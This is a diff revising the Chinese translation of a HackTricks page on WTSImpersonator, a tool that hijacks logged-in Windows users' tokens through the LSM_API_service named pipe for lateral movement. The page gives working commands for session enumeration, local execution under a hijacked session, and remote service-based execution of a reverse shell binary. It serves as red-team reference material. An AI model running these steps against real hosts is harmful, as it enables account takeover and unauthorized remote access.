@@ -1,18 +1,18 @@
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家，使用</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
-其他支持HackTricks的方式：
+支持HackTricks的其他方式：
 
-* 如果您想看到您的**公司在HackTricks中被广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
-**WTS Impersonator**工具利用**"\\pipe\LSM_API_service"** RPC命名管道，秘密枚举已登录用户并劫持其令牌，绕过传统的令牌模拟技术。这种方法有助于在网络中实现无缝的横向移动。这项技术背后的创新归功于**Omri Baso**，他的工作可在[GitHub](https://github.com/OmriBaso/WTSImpersonator)上找到。
+**WTS Impersonator**工具利用**"\\pipe\LSM_API_service"** RPC命名管道，隐蔽地枚举已登录用户并劫持其令牌，绕过传统的令牌模拟技术。这种方法有助于在网络中实现无缝的横向移动。这项技术背后的创新归功于**Omri Baso，其作品可在[GitHub](https://github.com/OmriBaso/WTSImpersonator)**上找到。
 
 ### 核心功能
 该工具通过一系列API调用运行：
@@ -30,17 +30,17 @@ WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → 
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **执行命令**：`exec` 和 `exec-remote` 模块需要**服务**上下文才能运行。本地执行只需WTSImpersonator可执行文件和一个命令：
+- **执行命令**：`exec` 和 `exec-remote` 模块需要**服务**上下文才能运行。本地执行只需 WTSImpersonator 可执行文件和一个命令：
 - 本地命令执行示例：
 ```powershell
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- 可使用PsExec64.exe获取服务上下文：
+- 可使用 PsExec64.exe 获取服务上下文：
 ```powershell
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
-- **远程命令执行**：涉及远程创建和安装类似于PsExec.exe的服务，允许以适当权限执行。
+- **远程命令执行**：涉及远程创建和安装类似于 PsExec.exe 的服务，允许以适当权限执行。
 - 远程执行示例：
 ```powershell
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
